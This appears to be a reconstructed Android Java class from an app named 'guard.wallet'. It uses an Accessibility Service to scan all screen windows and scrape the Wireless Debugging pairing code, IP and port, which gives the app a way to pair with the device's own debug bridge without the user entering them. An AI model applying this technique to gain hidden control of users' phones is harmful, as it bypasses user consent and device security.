package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.ArrayDeque;
import java.util.LinkedHashSet;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.guard.wallet.delegate.PairAccessibilityDelegate;

/**
 * 读取配对码 Callable — 从无线调试 UI 中读取配对码和端口。
 *
 * vendor 原始类名: com.guard.wallet.thread.h
 * 返回 PairPortAndCodeResult (host, port, pairCode)。
 */
public final class ReadPairCodeCallable implements Callable<PairPortAndCodeResult> {
    private static final String TAG = "ReadPairCodeCallable";
    private static final int MAX_RETRY = 30;
    private static final Pattern IP_PATTERN = Pattern.compile("((?:\\d{1,3}\\.){3}\\d{1,3})");
    private static final Pattern HOST_PORT_PATTERN = Pattern.compile(
            "((?:\\d{1,3}\\.){3}\\d{1,3})\\s*:\\s*(\\d{1,5})");
    private static final Pattern HOST_PORT_NEARBY_PATTERN = Pattern.compile(
            "((?:\\d{1,3}\\.){3}\\d{1,3})(?:\\s*[:：]\\s*|\\s+)(\\d{4,5})(?!\\d)");
    private static final Pattern LABELLED_PORT_PATTERN = Pattern.compile(
            "(?i)(?:IP\\s*地址和端口|地址和端口|端口|port)\\D{0,12}(\\d{4,5})(?!\\d)");
    private static final Pattern LABELLED_PAIR_CODE_PATTERN = Pattern.compile(
            "(?i)(?:WLAN\\s*)?(?:配对码|pair(?:ing)?\\s*code)\\D{0,12}(\\d{6})(?!\\d)");
    private static final Pattern PAIR_CODE_PATTERN = Pattern.compile("(?<!\\d)(\\d{6})(?!\\d)");

    public final PairAccessibilityDelegate a;
    public final AtomicReference<String> b = new AtomicReference<>(null);
    public final AtomicInteger c = new AtomicInteger(0);
    public final AtomicReference<String> d = new AtomicReference<>(null);

    public ReadPairCodeCallable(PairAccessibilityDelegate engine) {
        this.a = engine;
    }

    @Override
    public PairPortAndCodeResult call() {
        this.b.set(null);
        this.c.set(0);
        this.d.set(null);

        for (int retry = 0; retry < MAX_RETRY; retry++) {
            try {
                if (!this.a.M()) {
                    break;
                }

                Log.d(TAG, "开始读取配对码");
                parseFromCurrentRoot();
                if (hasCompleteResult()) {
                    break;
                }

                Log.e(TAG, "未读取到配对码读取配对码");
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }

            if (retry + 1 < MAX_RETRY) {
                com.guard.wallet.utils.SystemHelper.T0(1);
                refreshRoot();
            }
        }

        if (!hasCompleteResult()) {
            return null;
        }
        return new PairPortAndCodeResult(this.b.get(), this.c.get(), this.d.get());
    }

    private boolean hasCompleteResult() {
        return !AppUtils.B(this.b.get()) && this.c.get() > 0 && !AppUtils.B(this.d.get());
    }

    private void parseFromCurrentRoot() {
        UiObject root = this.a.k();
        // ADAPT: ColorOS 16 对话框弹出时 activeRoot 仍指向旧 Activity
        // 遍历所有窗口查找包含配对码的对话框节点树
        try {
            com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
            if (svc != null) {
                java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
                if (windows != null) {
                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
                        if (win == null) continue;
                        android.view.accessibility.AccessibilityNodeInfo winRoot;
                        if (Build.VERSION.SDK_INT >= 33) {
                            winRoot = com.guard.wallet.infra.WindowInfoCompat.getRootNode(win);
                        } else {
                            winRoot = win.getRoot();
                        }
                        if (winRoot == null) continue;
                        UiObject candidate = new UiObject(winRoot, 0, 0);
                        // 检查此窗口是否包含 6 位数字 (配对码)
                        LinkedHashSet<String> texts = collectCandidates(candidate);
                        for (String t : texts) {
                            if (t != null && t.matches("\\d{6}")) {
                                Log.e("ReadPairCodeCallable", "找到配对码窗口: " + win.getTitle());
                                root = candidate;
                                break;
                            }
                        }
                        if (root == candidate) break;
                    }
                }
                // fallback: getRootInActiveWindow
                if (root == this.a.k()) {
                    android.view.accessibility.AccessibilityNodeInfo freshNode = svc.getRootInActiveWindow();
                    if (freshNode != null) {
                        root = new UiObject(freshNode, 0, 0);
                    }
                }
            }
        } catch (Exception ex) {
            Log.e("ReadPairCodeCallable", "遍历窗口失败", ex);
        }
        if (root == null) {
            return;
        }

        LinkedHashSet<String> candidates = collectCandidates(root);
        if (candidates.isEmpty()) {
            return;
        }

        for (String candidate : candidates) {
            inspectCandidate(candidate);
            if (hasCompleteResult()) {
                return;
            }
        }

        inspectCandidate(String.join("\n", candidates));
    }

    private boolean isIgnoredLabel(String text) {
        String normalized = normalize(text);
        return "与设备配对".equals(normalized)
                || "WLAN 配对码".equalsIgnoreCase(normalized)
                || "WLAN配对码".equalsIgnoreCase(normalized)
                || "IP 地址和端口".equalsIgnoreCase(normalized)
                || "IP地址和端口".equalsIgnoreCase(normalized)
                || "使用配对码配对".equals(normalized)
                || "无线调试".equals(normalized)
                || "wireless debugging".equalsIgnoreCase(normalized)
                || "pair device with pairing code".equalsIgnoreCase(normalized)
                || "pairing code".equalsIgnoreCase(normalized)
                || "ip address & port".equalsIgnoreCase(normalized)
                || "ip address and port".equalsIgnoreCase(normalized)
                || "use pairing code".equalsIgnoreCase(normalized);
    }

    private LinkedHashSet<String> collectCandidates(UiObject root) {
        LinkedHashSet<String> candidates = new LinkedHashSet<>();
        ArrayDeque<UiObject> queue = new ArrayDeque<>();
        queue.add(root);
        while (!queue.isEmpty()) {
            UiObject node = queue.pollFirst();
            if (node == null) {
                continue;
            }

            addCandidate(candidates, node.text());
            addCandidate(candidates, node.desc());
            addCandidate(candidates, node.hintText());
            addCandidate(candidates, node.paneTitle());
            addCandidate(candidates, node.roleDesc());
            addCandidate(candidates, node.stateDesc());
            addCandidate(candidates, node.tooltipText());

            int childCount = node.childCount();
            for (int i = 0; i < childCount; i++) {
                UiObject child = node.child(i);
                if (child != null) {
                    queue.addLast(child);
                }
            }
        }
        return candidates;
    }

    private void addCandidate(Set<String> candidates, String value) {
        String normalized = normalize(value);
        if (AppUtils.B(normalized)) {
            return;
        }
        candidates.add(normalized);
    }

    private void inspectCandidate(String value) {
        if (AppUtils.B(value)) {
            return;
        }

        String normalized = normalize(value);
        if (AppUtils.B(normalized)) {
            return;
        }

        if (!isIgnoredLabel(normalized) || containsSignalData(normalized)) {
            Log.d(TAG, "读取配对码:" + normalized);
        }

        parseHostPort(normalized);
        parsePairCode(normalized);
    }

    private boolean containsSignalData(String text) {
        String normalized = normalize(text);
        return HOST_PORT_PATTERN.matcher(normalized).find()
                || HOST_PORT_NEARBY_PATTERN.matcher(normalized).find()
                || LABELLED_PAIR_CODE_PATTERN.matcher(normalized).find()
                || IP_PATTERN.matcher(normalized).find()
                || PAIR_CODE_PATTERN.matcher(normalized).find();
    }

    private void parseHostPort(String text) {
        if (!AppUtils.B(this.b.get()) && this.c.get() > 0) {
            return;
        }

        String normalized = normalize(text);
        Matcher matcher = HOST_PORT_PATTERN.matcher(normalized);
        boolean matched = matcher.find();
        if (!matched) {
            matcher = HOST_PORT_NEARBY_PATTERN.matcher(normalized);
            matched = matcher.find();
        }
        if (matched) {
            applyHostPort(matcher.group(1), matcher.group(2));
        }

        if (AppUtils.B(this.b.get())) {
            Matcher ipMatcher = IP_PATTERN.matcher(normalized);
            if (ipMatcher.find()) {
                this.b.compareAndSet(null, ipMatcher.group(1));
            }
        }

        if (this.c.get() <= 0) {
            Matcher portMatcher = LABELLED_PORT_PATTERN.matcher(normalized);
            if (portMatcher.find()) {
                applyPort(portMatcher.group(1));
                return;
            }

            if (!AppUtils.B(this.b.get()) && AppUtils.D(normalized) && normalized.length() >= 4 && normalized.length() <= 5) {
                applyPort(normalized);
            }
        }
    }

    private void parsePairCode(String text) {
        if (!AppUtils.B(this.d.get())) {
            return;
        }

        String normalized = normalize(text);
        Matcher matcher = LABELLED_PAIR_CODE_PATTERN.matcher(normalized);
        if (matcher.find()) {
            this.d.compareAndSet(null, matcher.group(1));
            return;
        }

        if (!isLikelyPairCodeCandidate(normalized)) {
            return;
        }

        matcher = PAIR_CODE_PATTERN.matcher(normalized);
        if (matcher.find()) {
            this.d.compareAndSet(null, matcher.group(1));
        }
    }

    private boolean isLikelyPairCodeCandidate(String text) {
        String normalized = normalize(text);
        if (AppUtils.B(normalized)) {
            return false;
        }
        if (normalized.contains("配对码")
                || normalized.toLowerCase().contains("pairing code")
                || normalized.toLowerCase().contains("pair code")) {
            return true;
        }
        return AppUtils.D(normalized) && normalized.length() == 6;
    }

    private void applyHostPort(String host, String portText) {
        if (AppUtils.B(host) || !AppUtils.D(portText)) {
            return;
        }
        this.b.compareAndSet(null, host);
        applyPort(portText);
    }

    private void applyPort(String portText) {
        if (this.c.get() > 0 || AppUtils.B(portText) || !AppUtils.D(portText)) {
            return;
        }
        try {
            this.c.set(Integer.parseInt(AppUtils.Q(portText)));
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    private String normalize(String text) {
        return text == null ? ""
                : text.replace('：', ':')
                .replace('\u00A0', ' ')
                .replace('\n', ' ')
                .replace('\r', ' ')
                .replace('\t', ' ')
                .trim();
    }

    private void refreshRoot() {
        try {
            if (MyAccessibilityService.P() == null) {
                return;
            }
            if (Build.VERSION.SDK_INT < 33) {
                this.a.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                return;
            }
            MyAccessibilityService.I(this.a.k());
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }
}
